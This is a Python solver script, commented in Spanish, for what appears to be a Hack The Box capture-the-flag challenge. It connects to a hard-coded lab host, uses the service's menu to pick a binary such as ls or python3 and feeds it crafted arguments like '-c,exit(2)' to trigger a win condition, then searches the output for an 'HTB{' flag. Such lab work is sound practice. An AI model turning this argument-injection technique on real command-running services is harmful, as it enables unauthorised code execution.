#!/usr/bin/env python3

import socket
import time
import sys
import select

def complete_exploit():
    """Explotación con captura completa de toda la respuesta"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("=== EXPLOTACIÓN CON CAPTURA COMPLETA ===")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(20)
        s.connect((host, port))
        
        print("¡Conectado!")
        
        def send_and_wait(cmd, wait_time=2):
            print(f"Enviando: {repr(cmd)}")
            s.send(cmd.encode())
            time.sleep(wait_time)
            
            # Capturar toda la respuesta disponible
            full_response = ""
            while True:
                try:
                    ready, _, _ = select.select([s], [], [], 0.1)
                    if ready:
                        data = s.recv(4096).decode('utf-8', errors='ignore')
                        if not data:
                            break
                        full_response += data
                    else:
                        break
                except:
                    break
            
            print(f"Respuesta completa ({len(full_response)} chars):")
            print("=" * 50)
            print(repr(full_response))
            print("=" * 50)
            print(full_response)
            print("=" * 50)
            return full_response
        
        # Leer banner inicial completo
        print("=== BANNER INICIAL ===")
        banner = send_and_wait("", 3)
        
        # Configurar mode
        print("\n=== CONFIGURANDO MODE ===")
        send_and_wait("1\n", 2)
        send_and_wait("~0\n", 2)
        
        # Configurar bin
        print("\n=== CONFIGURANDO BIN ===")
        send_and_wait("2\n", 2)
        send_and_wait("ls\n", 2)
        
        # Configurar args
        print("\n=== CONFIGURANDO ARGS ===")
        send_and_wait("3\n", 2)
        send_and_wait("--invalid-option\n", 2)
        
        # Configurar switches
        print("\n=== CONFIGURANDO SWITCHES ===")
        send_and_wait("4\n", 2)
        send_and_wait("/nonexistent\n", 2)
        
        # Ejecutar
        print("\n=== EJECUTANDO ===")
        final_response = send_and_wait("5\n", 5)
        
        # Buscar flag en toda la comunicación
        all_data = banner + final_response
        print(f"\n=== BUSCANDO FLAG EN TODA LA COMUNICACIÓN ({len(all_data)} chars) ===")
        
        if "What an awesome player!" in all_data:
            print("*** ¡¡¡CONDICIÓN DE VICTORIA CUMPLIDA!!! ***")
        
        if "HTB{" in all_data:
            start = all_data.find("HTB{")
            end = all_data.find("}", start) + 1
            if end > start:
                flag = all_data[start:end]
                print(f"🎉🎉🎉 FLAG ENCONTRADA: {flag} 🎉🎉🎉")
                s.close()
                return flag
        
        # Buscar cualquier línea interesante
        lines = all_data.split('\n')
        for i, line in enumerate(lines):
            if any(keyword in line.lower() for keyword in ['flag', 'htb{', 'awesome', 'player', 'win', 'victory']):
                print(f"Línea interesante {i}: {repr(line)}")
        
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        return None

def test_alternative_approach():
    """Probar enfoque alternativo con python3"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("\n=== ENFOQUE ALTERNATIVO CON PYTHON3 ===")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(20)
        s.connect((host, port))
        
        print("¡Conectado!")
        
        def send_and_wait(cmd, wait_time=2):
            print(f"Enviando: {repr(cmd)}")
            s.send(cmd.encode())
            time.sleep(wait_time)
            
            full_response = ""
            while True:
                try:
                    ready, _, _ = select.select([s], [], [], 0.1)
                    if ready:
                        data = s.recv(4096).decode('utf-8', errors='ignore')
                        if not data:
                            break
                        full_response += data
                    else:
                        break
                except:
                    break
            
            print(f"Respuesta ({len(full_response)} chars): {repr(full_response)}")
            return full_response
        
        # Banner
        banner = send_and_wait("", 3)
        
        # Configurar con python3
        send_and_wait("1\n", 2)
        send_and_wait("~0\n", 2)
        
        send_and_wait("2\n", 2)
        send_and_wait("python3\n", 2)
        
        send_and_wait("3\n", 2)
        send_and_wait("-c,exit(2)\n", 2)
        
        send_and_wait("4\n", 2)
        send_and_wait("-c,exit(1)\n", 2)
        
        final_response = send_and_wait("5\n", 5)
        
        # Buscar flag
        all_data = banner + final_response
        if "What an awesome player!" in all_data:
            print("*** ¡¡¡CONDICIÓN DE VICTORIA CUMPLIDA!!! ***")
        
        if "HTB{" in all_data:
            start = all_data.find("HTB{")
            end = all_data.find("}", start) + 1
            if end > start:
                flag = all_data[start:end]
                print(f"🎉🎉🎉 FLAG ENCONTRADA: {flag} 🎉🎉🎉")
                s.close()
                return flag
        
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    print("Iniciando captura completa...")
    
    # Primera estrategia
    flag = complete_exploit()
    if flag:
        print(f"¡FLAG ENCONTRADA: {flag}!")
        sys.exit(0)
    
    # Estrategia alternativa
    flag = test_alternative_approach()
    if flag:
        print(f"¡FLAG ENCONTRADA: {flag}!")
        sys.exit(0)
    
    print("No se encontró la flag")